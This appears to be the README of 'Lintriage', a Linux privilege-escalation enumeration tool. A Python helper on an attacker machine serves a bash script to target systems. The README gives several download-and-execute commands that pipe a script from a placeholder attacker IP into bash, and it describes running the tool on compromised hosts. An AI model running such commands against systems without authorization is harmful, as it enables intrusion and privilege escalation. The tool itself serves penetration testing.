# Lintriage

Linux Privilege Escalation Auto-Triage Tool

## Overview

Lintriage is a focused Linux privilege escalation enumeration tool that runs only the checks you care about, avoiding the noise of comprehensive tools like LinPEAS. It performs targeted checks for common privilege escalation vectors and presents findings in a clear HIGH/MEDIUM/INFO format.

## Features

### Enumeration Checks

Lintriage checks for:

- **SUID binaries** - Identifies setuid binaries, especially dangerous ones
- **Writable cron jobs** - Finds writable cron files and directories
- **Writable systemd services** - Detects writable systemd service files
- **Linux capabilities** - Checks for files with dangerous capabilities
- **Interesting files** - Searches for .bak, .old, .conf, and other potentially sensitive files
- **Kernel version** - Checks kernel version against known vulnerabilities

### User Interface

- **Sleek design** - Beautiful ASCII art header and clean box-drawing characters
- **Color-coded output** - Easy-to-read severity levels (HIGH/MEDIUM/INFO)
- **Progress indicators** - Real-time check status with visual feedback
- **Organized results** - Findings grouped by severity with clear formatting
- **Summary statistics** - Quick overview of findings at a glance

## Installation

```bash
# Clone the repository
git clone <repository-url>
cd Lintriage
```

## Usage

### Lintriage Helper (Attacker Machine)

The `lintriage.py` script is a beautiful helper tool for serving and managing builds:

```bash
# Show information and help
python3 lintriage.py info

# Check build status
python3 lintriage.py status

# Start the build server (default port 8000)
python3 lintriage.py serve

# Start server on custom port
python3 lintriage.py serve --port 8080
```

The helper provides:
- **Beautiful console UI** with color-coded output and box formatting
- **Build information** - file size, modification date, status
- **Download commands** - ready-to-use wget/curl commands displayed nicely
- **Server status** - real-time connection logging
- **Network detection** - automatically shows local and network URLs

### Downloading on Target Machine

Once the server is running, download the script on your target Linux machine:

**Using wget:**
```bash
wget http://<ATTACKER_IP>:8000/lintriage.sh -O lintriage.sh
chmod +x lintriage.sh
./lintriage.sh
```

**Using curl:**
```bash
curl http://<ATTACKER_IP>:8000/lintriage.sh -o lintriage.sh
chmod +x lintriage.sh
./lintriage.sh
```

**Alternative: Direct execution (one-liner):**
```bash
# Download and execute in one command
wget -qO- http://<ATTACKER_IP>:8000/lintriage.sh | bash

# Or with curl
curl -s http://<ATTACKER_IP>:8000/lintriage.sh | bash
```

**Note:** The bash script (`lintriage.sh`) in the `builds/` directory is designed for easy upload and execution on target Linux machines. It requires no Python or additional dependencies - just standard Linux utilities.

## Output Format

Lintriage organizes findings into three severity levels:

- **HIGH** - Critical findings that often lead to privilege escalation (red)
- **MEDIUM** - Potentially exploitable findings (yellow)
- **INFO** - Informational findings that may be useful (blue)

## Requirements

### For Serving (Attacker Machine)
- Python 3.6+
- Network access to target machine

### For Running (Target Machine)
- Bash shell
- Linux system
- Standard Linux utilities (find, getcap, uname, crontab, etc.)
- No Python or additional dependencies required

## Example Output

```
  ██      ██ ███    ██ ████████ ██████  ██  █████   ██████  ███████ 
  ██      ██ ████   ██    ██    ██   ██ ██ ██   ██ ██       ██      
  ██      ██ ██ ██  ██    ██    ██████  ██ ███████ ██   ███ █████   
  ██      ██ ██  ██ ██    ██    ██   ██ ██ ██   ██ ██    ██ ██      
  ███████ ██ ██   ████    ██    ██   ██ ██ ██   ██  ██████  ███████ 
                                                                                                                  
        Linux Privilege Escalation Auto-Triage Tool              
        Focused enumeration without the noise                    


✓ SUID binaries [completed]
✓ Writable cron jobs [completed]
✓ Writable systemd services [completed]
✓ Linux capabilities [completed]
✓ Interesting files [completed]
✓ Kernel version [completed]

┌────────────────────────────────────────────────────────────┐
│  ⚠  HIGH SEVERITY FINDINGS                                 │
└────────────────────────────────────────────────────────────┘

• [1] SUID Binary
   ➜ Dangerous SUID binary found: /usr/bin/find
   └─ Binary: find - Known to be exploitable

╔════════════════════════════════════════════════════════════╗
║                        SUMMARY                             ║
╠════════════════════════════════════════════════════════════╣
║  HIGH:   1  │  MEDIUM: 3  │  INFO:   5  │  TOTAL: 9        ║
╚════════════════════════════════════════════════════════════╝
```

## Project Structure

```
Lintriage/
├── lintriage.py          # Helper tool (build server & management)
├── builds/
│   └── lintriage.sh      # Bash script build (served to target machines)
├── README.md
└── LICENSE
```

### Components

- **`lintriage.py`** - Beautiful helper tool with console UI for serving builds
- **`builds/lintriage.sh`** - The actual enumeration script (bash, no dependencies)

## Workflow

1. **On attacker machine:** 
   - Run `python3 lintriage.py serve` to start the HTTP server
   - The helper will display beautiful UI with download commands
   
2. **On target machine:** 
   - Copy one of the displayed download commands (wget/curl)
   - Or use the one-liner: `wget -qO- http://<IP>:8000/lintriage.sh | bash`
   
3. **On target machine:** 
   - Execute `./lintriage.sh` to run the enumeration
   - Or use the one-liner for direct execution

This workflow allows you to easily transfer and execute the tool on compromised Linux systems without needing to manually upload files or install dependencies. The helper tool provides a beautiful, user-friendly interface for managing the entire process.

## License

See LICENSE file for details.
